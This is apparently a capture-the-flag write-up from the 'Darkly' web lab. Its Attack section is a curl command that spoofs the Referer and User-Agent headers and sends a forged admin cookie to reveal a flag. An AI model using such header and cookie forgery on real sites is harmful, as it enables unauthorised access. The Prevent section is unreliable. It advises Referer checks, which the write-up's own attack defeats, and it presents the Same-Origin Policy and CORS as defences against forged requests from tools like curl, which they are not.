# Description

Visting Home page we find a link in `© BornToSec` in the footer of the page.

If we checked the source code of the html file we find this string
`<!--
You must come from : "https://www.nsa.gov/".
-->
`

As it seems that we need to change to referer of the request so that it the webserver thinks that the request is comming from `https://www.nsa.gov/`


# Attack

```bash
*[main][~/projects/darkly]$ curl 'http://10.14.59.83/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' \
  -H 'Accept-Language: en-US,en;q=0.9,ar;q=0.8,fr;q=0.7' \
  -H 'Cache-Control: max-age=0' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: I_am_admin=68934a3e9455fa72420237eb05902327' \
  -H 'Referer: https://www.nsa.gov/' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'User-Agent: ft_bornToSec' \
  --compressed \
  --insecure | grep flag
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2574    0  2574    0     0  2486k      0 -<center><h2 style="margin-top:50px;"> The flag is : f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <audio id="best_music_ever" src="audio/music.mp3"preload="true" loop="loop" autoplay="autoplay">
-:--:-- --:--:-- --:--:-- 2513k

```

# Prevent
	- *Referrer Header Check:*Implement a server-side check that verifies the Referer header of incoming requests. If the request is supposed to come from a specific source, make sure it matches that source. If it doesn't, deny the request.

	- *Use Same-Origin Policy:* Leverage the Same-Origin Policy to prevent unauthorized cross-origin requests. Configure your server to disallow requests from domains other than your own.

	- *Cross-Origin Resource Sharing (CORS):* If you need to allow certain cross-origin requests, set up CORS properly. Specify which origins are allowed to access your resources by configuring CORS headers on the server.